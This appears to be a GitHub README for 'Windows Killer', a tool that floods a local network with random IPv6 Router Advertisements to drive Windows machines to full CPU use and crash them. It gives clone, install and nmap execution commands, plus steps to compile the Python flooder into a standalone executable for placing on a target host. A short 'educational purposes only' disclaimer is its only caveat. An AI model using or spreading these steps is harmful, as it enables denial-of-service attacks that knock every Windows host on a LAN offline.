# Windows Killer

Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS), will start to compute IPv6 suffix and update their routing table to reflect the accepted announcement. This will cause 100% CPU usage on Windows and platforms, preventing to process other application requests.

# Install

git clone https://github.com/Kleptocratic/WindowsKiller.git

# Check for location of other NSE scripts

find / -name '*.nse'

# Move downloaded files into directory

sudo mv WindowsKiller.nse /usr/local/share/nmap/scripts/

# Execute script

nmap -6 --script WindowsKiller.nse --script-args 'interface=<interface>'
  
# WindowKiller.py
  
Designed as an eternal loop to be compiled as an executable and placed on target host, the script will pseudo-generate IPv6 Router Advertisements and flood the network with potential connections. Warning: this script will crash most, if not all, Windows operating systems within the LAN. This script is for educational purposes only. Be wise, stay legal.

# Compiling WindowsKiller.py as an Executable
  
Install PyInstaller from PyPI:

  pip install pyinstaller

Go to your program’s directory and run:

  pyinstaller --onefile WindowsKiller.py

Navigate to the "dist" file to find your executable!
